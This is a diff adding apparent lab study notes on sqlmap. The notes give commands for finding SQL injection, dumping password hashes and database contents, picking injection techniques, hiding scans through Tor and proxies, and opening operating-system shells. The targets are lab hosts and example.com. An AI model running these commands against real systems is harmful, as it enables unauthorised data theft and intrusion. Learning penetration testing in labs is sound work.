@@ -1,0 +1,126 @@
+#+title: Sqlmap
+#+author: gabriel
+
+SQLMap provides the capability to test a wide range of database management systems. Supported databases include MySQL, Oracle, PostgreSQL, Microsoft SQL Server, SQLite, and many more.
+
+* basic SQLMap parameters
+
+| Parameter| Description
+| -h| Basic help menu
+| -hh | Advanced help menu
+| -u/--url | Target URL
+| --data | Data string to be sent through POST (e.g., "id=1")
+| -p | Parameter to test for SQL injection
+| --dbms | Specify the target database management system (e.g., MySQL, Oracle)
+| --risk | Specify the risk level of the tests (1-3)
+| --level | Specify the level of tests to perform (1-5)
+| --dump | Used to dump the database contents
+| --os-shell | Attempt to open a shell on the target system to execute commands
+
+We'll use the -u parameter to specify the target. After starting the lab and obtaining the provided URL, let's perform a scan with the following command:
+
+: sqlmap -u "https://bursting-bulletgirl.europe1.hackviser.space/?search=test"
+
+As a result of our basic scan, SQLMap discovered an SQL Injection vulnerability in the search GET parameter of the target system.
+
+As a result of our basic scan, SQLMap discovered an SQL Injection vulnerability in the search GET parameter of the target system.
+
+** sqli with sqlmap attack via POST data
+We will use the --data parameter to specify the POST data and the -p parameter to specify the field we want to test
+
+: sqlmap -u "https://prepared-smasher.europe1.hackviser.space/login.php" --data="username=test&password=test" -p "username"
+
+** detecting the database user
+We will use the --current-user parameter to detect the active database user.
+: sqlmap -u "https://bursting-bulletgirl.europe1.hackviser.space/?search=test" --current-user
+
+** detecting the database name
+We will use the --current-db parameter to detect the currently used database.
+: sqlmap -u "https://bursting-bulletgirl.europe1.hackviser.space/?search=test" --current-db
+
+** database user password hashes
+We will use the --passwords parameter to detect the password hashes of the database users.
+: sqlmap -u "https://bursting-bulletgirl.europe1.hackviser.space/?search=test" --passwords
+
+** listing databases
+We will use the --dbs parameter to detect the databases present in the database management system.
+: sqlmap -u "https://bursting-bulletgirl.europe1.hackviser.space/?search=test" --dbs
+
+** listing tables
+We will use the --tables parameter to detect tables present in the database management system.
+
+If we want to list tables in a specific database instead of all databases, we need to specify the database using the -D parameter.
+: -u "https://bursting-bulletgirl.europe1.hackviser.space/?search=test" --tables -D ecliptica_cars
+
+** listing table columns
+We will use the --columns parameter to detect the table columns in a database. If we want to list the tables in a specific database, we need to specify the database using the -D parameter.
+: sqlmap -u "https://bursting-bulletgirl.europe1.hackviser.space/?search=test" --columns -D ecliptica_cars
+
+** retrieving data
+We will use the --dump parameter to fetch data from the tables.
+: sqlmap -u "https://bursting-bulletgirl.europe1.hackviser.space/?search=test" --dump -D ecliptica_cars
+
+* commont attack techniques with sqlmap
+In this section, we will discuss common attack techniques that can be performed using SQLMap's --technique parameter and how to apply them.
+
+** Error-Based SQL Injection (E)
+Error-Based SQL Injection aims to retrieve database structure information by exploiting error messages generated from SQL queries. SQLMap can automatically detect such vulnerabilities and extract data from the database.
+: sqlmap -u "http://example.com/vulnerable.php?id=1" --technique=E
+
+** Blind SQL Injection (B)
+Blind SQL Injection attempts to extract data by interpreting the true or false outcomes of database queries. This method is used to extract database content without error messages by relying on true/false responses.
+: sqlmap -u "http://example.com/vulnerable.php?id=1" --technique=B
+
+** Union Query SQL Injection (U)
+Union Query SQL Injection uses UNION SELECT statements to combine the results of multiple queries and extract information. This technique can also manipulate database queries to obtain additional data.
+: sqlmap -u "http://example.com/vulnerable.php?id=1" --technique=U
+
+** Stacked Queries SQL Injection (S)
+Stacked Queries SQL Injection allows multiple SQL statements to be executed within a single query. This enables an attacker to run additional commands on the database, gaining more control.
+: sqlmap -u "http://example.com/vulnerable.php?id=1" --technique=S
+
+** Time-Based Blind SQL Injection (T)
+Time-Based Blind SQL Injection aims to extract information by monitoring the response time of database queries. When a query is true, it introduces a delay in the response, allowing the attacker to determine the correctness of the query.
+: sqlmap -u "http://example.com/vulnerable.php?id=1" --technique=T
+
+** Out-of-Band SQL Injection (Q)
+Out-of-Band SQL Injection causes the database server to interact with an attacker-controlled server, exfiltrating information.
+: sqlmap -u "http://example.com/vulnerable.php?id=1" --technique=Q
+
+* Advanced Features of SQLMap
+SQLMap offers many advanced features that allow users to conduct in-depth penetration testing. Let's discuss some of the advanced features provided by SQLMap along with usage examples.
+
+** scanning with http request file
+In this method, scanning is performed using a file that contains captured HTTP requests, usually exported from burp
+: sqlmap -r request_file.txt
+
+** scanning with post data
+SQLMap can scan requests sent with POST data. This feature is particularly useful for form-based logins and applications where data is sent using the POST method.
+: sqlmap -u "http://example.com/login.php" --data="username=admin&password=admin"
+
+** session management
+SQLMap saves the scanning process in a session file, allowing users to save the scan status and continue from that point later. This feature is especially useful for large and time-consuming scans.
+: sqlmap -u "http://example.com/vulnerable.php?id=1" --session=session_name
+
+** custom queries and sql commands
+With SQLMap, users can send their own SQL queries and execute specific database commands. This feature is beneficial for advanced users who want to go beyond standard SQLMap operations.
+: sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-query="SELECT * FROM users"
+
+** http request parameters
+SQLMap offers various parameters to manipulate HTTP requests:
+
+ * --cookie: Can be used to add custom cookies for session management required applications.
+ * --user-agent: Changes the User-Agent value used in requests.
+ * --referer: Used to customize the Referer header.
+
+: sqlmap -u "http://example.com/vulnerable.php?id=1" --cookie="PHPSESSID=abc123" --user-agent="Mozilla/5.0" --referer="http://example.com"
+
+** tor and proxy support
+SQLMap supports anonymous scanning via the Tor network and can send requests through specified proxy servers. This helps to perform tests without leaving traces.
+: sqlmap -u "http://example.com/vulnerable.php?id=1" --tor --proxy="http://proxy_address:port"
+
+** access to Operating system shell
+ * --os-shell: Provides an interactive operating system shell.
+ * --os-pwn: Provides an external connection shell like Meterpreter or VNC.
+ * --os-cmd: Executes a specific operating system command.
+ * --priv-esc: Attempts to escalate database process user privileges.
